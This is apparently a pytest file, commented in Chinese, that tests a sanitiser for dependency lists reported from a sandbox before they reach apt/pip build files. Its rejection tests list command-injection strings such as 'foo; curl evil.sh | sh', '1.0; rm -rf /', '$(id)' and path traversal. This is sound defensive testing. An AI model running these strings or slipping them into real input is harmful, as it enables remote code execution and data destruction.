"""待審依賴清單的測試。

這一組測試守的是一條很短、但後果很長的路徑：沙箱裡執行的任意程式碼回報
「我裝了什麼」→ controller 寫進 hermes-deps 卷 → 人在宿主機上 make deps-accept
→ 內容變成 runtime/deps/apt.txt 的一行 → 下一次 build 時變成 `apt-get install`
的參數。中間確實有人工審查，但審查是靠「有人真的看了」，而消毒是靠程式碼。

所以這裡的重點不是「正常的套件名過得了」，而是「奇怪的東西過不了，而且過不了
的時候有留下痕跡」—— 靜靜地少掉幾個項目跟寫錯檔案一樣糟。

不需要 Docker，也不需要 controller 跑起來。
"""

from __future__ import annotations

import json
import os

import pytest

os.environ.setdefault("SANDBOX_NETWORK", "hermes-test-net")
os.environ.setdefault("SANDBOX_IMAGE", "hermes-sandbox:test")

from app import deps as D  # noqa: E402


def _installed(**kinds: list[dict[str, str]]) -> dict[str, object]:
    return dict(kinds)


# --- 消毒：正常輸入 ---------------------------------------------------------


def test_clean_entries_survive() -> None:
    clean, rejected = D.sanitise(
        _installed(
            apt=[{"name": "postgresql-17", "version": "17.10-0+deb13u1"}],
            pip=[{"name": "pandas", "version": "2.3.1"}],
        )
    )
    assert clean["apt"] == [{"name": "postgresql-17", "version": "17.10-0+deb13u1"}]
    assert clean["pip"] == [{"name": "pandas", "version": "2.3.1"}]
    assert rejected == []


@pytest.mark.parametrize(
    "name",
    [
        "libstdc++6",       # 加號
        "ca-certificates",  # 減號
        "python3.13",       # 點
        "typing_extensions",  # 底線（PEP 508）
        "PyYAML",           # 大寫
    ],
)
def test_real_package_names_are_not_rejected(name: str) -> None:
    """為了嚴謹而擋掉合法套件，比放寬一格更常見也更難查。"""
    clean, rejected = D.sanitise(_installed(apt=[{"name": name, "version": "1.0"}]))
    assert [e["name"] for e in clean["apt"]] == [name]
    assert rejected == []


@pytest.mark.parametrize("version", ["1:2.3-4", "17.10-0+deb13u1", "6.0~rc1", "2.3.1"])
def test_real_version_strings_are_not_rejected(version: str) -> None:
    """Debian 的 epoch 用冒號、pre-release 用波浪號，兩個都得放行。"""
    clean, _ = D.sanitise(_installed(apt=[{"name": "foo", "version": version}]))
    assert clean["apt"] == [{"name": "foo", "version": version}]


def test_upgrades_keep_the_previous_version() -> None:
    clean, _ = D.sanitise(
        _installed(apt=[{"name": "curl", "version": "8.14.1", "previous": "8.14.0"}])
    )
    assert clean["apt"][0]["previous"] == "8.14.0"


def test_entries_are_sorted_by_name() -> None:
    """排序讓 runtime/deps/*.txt 的 git diff 穩定 —— 換了順序不算改動。"""
    clean, _ = D.sanitise(
        _installed(
            apt=[
                {"name": "zlib1g", "version": "1"},
                {"name": "curl", "version": "1"},
                {"name": "make", "version": "1"},
            ]
        )
    )
    assert [e["name"] for e in clean["apt"]] == ["curl", "make", "zlib1g"]


# --- 消毒：惡意與畸形輸入 ---------------------------------------------------


@pytest.mark.parametrize(
    "name",
    [
        "foo; curl evil.sh | sh",  # 命令注入 —— 這條路徑存在的理由
        "foo bar",                 # 空白會被 apt 當成兩個套件
        "$(id)",
        "`id`",
        "../../etc/passwd",
        "-foo",                    # 開頭的減號會被當成 apt 的旗標
        "--allow-downgrades",
        "",
        "x" * 200,                 # 超長
        "套件",                    # 非 ASCII
        "foo\nbar",
    ],
)
def test_dangerous_names_are_rejected(name: str) -> None:
    clean, rejected = D.sanitise(_installed(apt=[{"name": name, "version": "1.0"}]))
    assert clean["apt"] == []
    assert rejected, "被丟掉的項目一定要留下原因，不能靜靜消失"


@pytest.mark.parametrize("version", ["1.0; rm -rf /", "1.0 2.0", "$(id)", "", "v" * 200])
def test_dangerous_versions_are_rejected(version: str) -> None:
    clean, rejected = D.sanitise(_installed(pip=[{"name": "pandas", "version": version}]))
    assert clean["pip"] == []
    assert len(rejected) == 1
    assert "pandas" in rejected[0]


def test_a_bad_entry_does_not_take_down_the_good_ones() -> None:
    clean, rejected = D.sanitise(
        _installed(
            apt=[
                {"name": "curl", "version": "8.14.1"},
                {"name": "foo; id", "version": "1"},
                {"name": "jq", "version": "1.7"},
            ]
        )
    )
    assert [e["name"] for e in clean["apt"]] == ["curl", "jq"]
    assert len(rejected) == 1


def test_bogus_previous_is_dropped_without_dropping_the_entry() -> None:
    """previous 只是給人看的參考，壞掉不值得丟掉整個項目。"""
    clean, _ = D.sanitise(
        _installed(apt=[{"name": "curl", "version": "8.14.1", "previous": "; id"}])
    )
    assert clean["apt"] == [{"name": "curl", "version": "8.14.1"}]


def test_duplicate_names_collapse() -> None:
    clean, _ = D.sanitise(
        _installed(apt=[{"name": "curl", "version": "1"}, {"name": "curl", "version": "2"}])
    )
    assert len(clean["apt"]) == 1


def test_package_count_is_capped_and_the_truncation_is_reported() -> None:
    entries = [{"name": f"pkg{i}", "version": "1"} for i in range(D._MAX_PACKAGES_PER_KIND + 50)]
    clean, rejected = D.sanitise(_installed(apt=entries))
    assert len(clean["apt"]) == D._MAX_PACKAGES_PER_KIND
    assert any("上限" in r for r in rejected)


@pytest.mark.parametrize("installed", [None, "nope", 42, [], {"apt": "curl"}, {"apt": [1, 2]}])
def test_malformed_shapes_never_raise(installed: object) -> None:
    """消毒是在 lifecycle 的 try/except 之外被呼叫的路徑之一，不能拋。"""
    clean, rejected = D.sanitise(installed)
    assert clean == {"apt": [], "pip": []}
    assert rejected


def test_unavailable_snapshot_is_surfaced() -> None:
    """「量到 0 個」與「量不到」必須分得出來，否則會誤以為什麼都沒裝。"""
    _, rejected = D.sanitise({"apt": [], "pip": [], "unavailable": ["apt"]})
    assert any("抓不到" in r for r in rejected)


# --- 寫檔與處置 -------------------------------------------------------------


def _record(tmp_path, **over):  # noqa: ANN001, ANN003
    kwargs = dict(
        task_id="evo-20260811T000000Z-abc",
        skill="demo",
        installed=_installed(apt=[{"name": "jq", "version": "1.7"}]),
        privileged=True,
        sandbox_status="succeeded",
        instance="test",
    )
    kwargs.update(over)
    return D.record(tmp_path, **kwargs)


def test_record_writes_a_pending_file(tmp_path) -> None:  # noqa: ANN001
    path = _record(tmp_path)
    assert path is not None
    payload = json.loads(path.read_text(encoding="utf-8"))
    assert payload["packages"]["apt"] == [{"name": "jq", "version": "1.7"}]
    assert payload["privileged"] is True
    assert payload["task_id"] == "evo-20260811T000000Z-abc"


def test_record_leaves_no_tmp_file_behind(tmp_path) -> None:  # noqa: ANN001
    """寫檔是 tmp + os.replace。半寫完的 JSON 被 make deps-list 讀到會很難解釋。"""
    _record(tmp_path)
    assert list((tmp_path / "pending").glob("*.tmp")) == []


def test_nothing_installed_writes_nothing(tmp_path) -> None:  # noqa: ANN001
    """裝滿空清單的 pending/ 會讓「有東西要審」這個訊號失去意義。"""
    assert _record(tmp_path, installed={"apt": [], "pip": []}) is None
    assert not (tmp_path / "pending").exists()


def test_only_junk_installed_writes_nothing(tmp_path) -> None:  # noqa: ANN001
    assert _record(tmp_path, installed={"apt": [{"name": "; id", "version": "1"}]}) is None


@pytest.mark.parametrize("task_id", ["../escape", "a/b", "-", "", "x" * 200, "evo 1"])
def test_task_id_must_be_usable_as_a_filename(tmp_path, task_id: str) -> None:  # noqa: ANN001
    """task_id 由 controller 產生，但它會變成路徑，所以還是驗一次。"""
    with pytest.raises(ValueError):
        _record(tmp_path, task_id=task_id)


def test_list_and_get_round_trip(tmp_path) -> None:  # noqa: ANN001
    _record(tmp_path)
    pending = D.list_pending(tmp_path)
    assert len(pending) == 1
    assert D.get_pending(tmp_path, "evo-20260811T000000Z-abc") == pending[0]


def test_list_pending_on_a_fresh_volume_is_empty(tmp_path) -> None:  # noqa: ANN001
    assert D.list_pending(tmp_path) == []


def test_list_pending_skips_unreadable_files(tmp_path) -> None:  # noqa: ANN001
    """一份壞掉的 JSON 不該讓整個列表變成 500。"""
    _record(tmp_path)
    (tmp_path / "pending" / "broken.json").write_text("{ not json", encoding="utf-8")
    assert len(D.list_pending(tmp_path)) == 1


@pytest.mark.parametrize("outcome", ["accepted", "rejected"])
def test_resolve_moves_the_file_instead_of_deleting_it(tmp_path, outcome: str) -> None:  # noqa: ANN001
    """「誰在什麼時候決定 runtime 要裝什麼」屬於稽核軌跡。"""
    _record(tmp_path)
    assert D.resolve(tmp_path, "evo-20260811T000000Z-abc", outcome=outcome) is True
    assert D.list_pending(tmp_path) == []
    moved = list((tmp_path / outcome).glob("*.json"))
    assert len(moved) == 1
    assert json.loads(moved[0].read_text(encoding="utf-8"))["skill"] == "demo"


def test_resolve_is_not_an_error_when_there_is_nothing_to_resolve(tmp_path) -> None:  # noqa: ANN001
    assert D.resolve(tmp_path, "evo-nope", outcome="rejected") is False


def test_resolve_rejects_unknown_outcomes(tmp_path) -> None:  # noqa: ANN001
    _record(tmp_path)
    with pytest.raises(ValueError):
        D.resolve(tmp_path, "evo-20260811T000000Z-abc", outcome="deleted")
